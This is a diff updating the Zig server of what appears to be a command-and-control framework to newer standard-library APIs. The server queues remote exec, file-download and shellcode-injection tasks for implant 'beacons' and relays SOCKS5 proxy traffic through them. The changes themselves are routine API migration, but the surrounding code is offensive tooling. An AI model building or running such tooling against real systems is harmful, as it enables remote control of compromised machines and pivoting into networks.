@@ -6,6 +6,7 @@ const std = @import("std");
 const crypto = @import("crypto.zig");
 const Ui = @import("ui.zig").Ui;
 const Socks5Server = @import("socks.zig").Socks5Server;
+const util = @import("util.zig");
 const os = if (@hasDecl(std, "posix")) std.posix else std.os;
 
 pub const Server = struct {
@@ -13,7 +14,7 @@ pub const Server = struct {
     port: u16,
     key: [crypto.KeySize]u8,
     beacons: std.StringHashMap(Beacon),
-    tasks: std.ArrayList(Task),
+    tasks: std.ArrayListUnmanaged(Task),
     socks_server: ?Socks5Server = null,
     socks_clients: std.AutoHashMap(u32, std.net.Stream),
     next_proxy_id: u32 = 1,
@@ -45,7 +46,7 @@ pub const Server = struct {
             .port = port,
             .key = key,
             .beacons = std.StringHashMap(Beacon).init(allocator),
-            .tasks = std.ArrayList(Task).init(allocator),
+            .tasks = .empty,
             .socks_clients = std.AutoHashMap(u32, std.net.Stream).init(allocator),
             .mutex = .{},
         };
@@ -66,7 +67,7 @@ pub const Server = struct {
             self.allocator.free(task.command);
             if (task.result) |res| self.allocator.free(res);
         }
-        self.tasks.deinit();
+        self.tasks.deinit(self.allocator);
     }
 
     pub fn start(self: *Server) !void {
@@ -94,7 +95,7 @@ pub const Server = struct {
         }
     }
 
-    fn shellLoop(self: *Server) void {
+    fn shellLoop(self: *Server) !void {
         const stdin_file = std.fs.File.stdin();
         var stdin_buffer: [1024]u8 = undefined;
         var stdin_reader_state = stdin_file.reader(&stdin_buffer);
@@ -200,7 +201,7 @@ pub const Server = struct {
         std.debug.print("-------------\n", .{});
     }
 
-    fn handleConnection(self: *Server, conn: std.net.Server.Connection) void {
+    fn handleConnection(self: *Server, conn: std.net.Server.Connection) !void {
         defer conn.stream.close();
         var read_buffer: [4096]u8 = undefined;
         var write_buffer: [4096]u8 = undefined;
@@ -231,13 +232,11 @@ pub const Server = struct {
                 const enc_resp = crypto.encrypt(self.allocator, self.key, r) catch break;
                 defer self.allocator.free(enc_resp);
 
-                writer.writeInt(u32, @as(u32, @intCast(enc_resp.len)), .little) catch break;
-                writer.writeAll(enc_resp) catch break;
-                writer.flush() catch break;
+                try writer.writeInt(u32, @as(u32, @intCast(enc_resp.len)), .little);
+                try writer.writeAll(enc_resp);
             } else {
                 // Send zero length if no response
-                writer.writeInt(u32, 0, .little) catch break;
-                writer.flush() catch break;
+                try writer.writeInt(u32, 0, .little);
             }
         }
     }
@@ -423,7 +422,7 @@ pub const Server = struct {
         defer self.mutex.unlock();
 
         const id = @as(u64, @intCast(self.tasks.items.len + 1));
-        try self.tasks.append(.{
+        try self.tasks.append(self.allocator, .{
             .id = id,
             .type = .exec,
             .beacon_id = try self.allocator.dupe(u8, beacon_id),
@@ -438,7 +437,7 @@ pub const Server = struct {
         defer self.mutex.unlock();
 
         const id = @as(u64, @intCast(self.tasks.items.len + 1));
-        try self.tasks.append(.{
+        try self.tasks.append(self.allocator, .{
             .id = id,
             .type = .download,
             .beacon_id = try self.allocator.dupe(u8, beacon_id),
@@ -453,7 +452,7 @@ pub const Server = struct {
         defer self.mutex.unlock();
 
         const id = @as(u64, @intCast(self.tasks.items.len + 1));
-        try self.tasks.append(.{
+        try self.tasks.append(self.allocator, .{
             .id = id,
             .type = .audit,
             .beacon_id = try self.allocator.dupe(u8, beacon_id),
@@ -473,7 +472,7 @@ pub const Server = struct {
         _ = encoder.encode(b64_data, shellcode);
         
         const id = @as(u64, @intCast(self.tasks.items.len + 1));
-        try self.tasks.append(.{
+        try self.tasks.append(self.allocator, .{
             .id = id,
             .type = .inject,
             .beacon_id = try self.allocator.dupe(u8, beacon_id),
@@ -481,23 +480,33 @@ pub const Server = struct {
             .status = .queued,
         });
         return id;
-    fn socksLoop(self: *Server) void {
+    }
+
+    fn socksLoop(self: *Server) !void {
         while (true) {
             if (self.socks_server) |*s| {
                 const conn = s.accept() catch {
-                    std.time.sleep(100 * 1_000_000);
+                    util.sleep(100 * 1_000_000);
                     continue;
                 };
-                (try std.Thread.spawn(.{}, handleSocksClient, .{ self, conn })).detach();
+                if (std.Thread.spawn(.{}, handleSocksClient, .{ self, conn })) |thread| {
+                    thread.detach();
+                } else |_| {
+                    conn.stream.close();
+                }
             } else {
-                std.time.sleep(1 * 1_000_000_000);
+                util.sleep(1 * 1_000_000_000);
             }
         }
     }
 
     fn handleSocksClient(self: *Server, conn: std.net.Server.Connection) void {
-        const reader = conn.stream.reader();
-        const writer = conn.stream.writer();
+        var rb: [4096]u8 = undefined;
+        var wb: [4096]u8 = undefined;
+        var r_state = conn.stream.reader(&rb);
+        var w_state = conn.stream.writer(&wb);
+        const reader = r_state.interface();
+        const writer = &w_state.interface;
 
         Socks5Server.handleHandshake(reader, writer) catch return;
         const req = Socks5Server.handleRequest(self.allocator, reader, writer) catch return;
@@ -531,7 +540,7 @@ pub const Server = struct {
 
         var buf: [4096]u8 = undefined;
         while (true) {
-            const len = reader.read(&buf) catch break;
+            const len = reader.readSliceShort(&buf) catch break;
             if (len == 0) break;
             self.queueProxyWrite(beacon_id, id, buf[0..len]) catch break;
         }
@@ -549,7 +558,7 @@ pub const Server = struct {
         self.mutex.lock();
         defer self.mutex.unlock();
         const tid = @as(u64, @intCast(self.tasks.items.len + 1));
-        try self.tasks.append(.{
+        try self.tasks.append(self.allocator, .{
             .id = tid,
             .type = .proxy,
             .beacon_id = try self.allocator.dupe(u8, beacon_id),
@@ -573,7 +582,7 @@ pub const Server = struct {
         self.mutex.lock();
         defer self.mutex.unlock();
         const tid = @as(u64, @intCast(self.tasks.items.len + 1));
-        try self.tasks.append(.{
+        try self.tasks.append(self.allocator, .{
             .id = tid,
             .type = .proxy,
             .beacon_id = try self.allocator.dupe(u8, beacon_id),
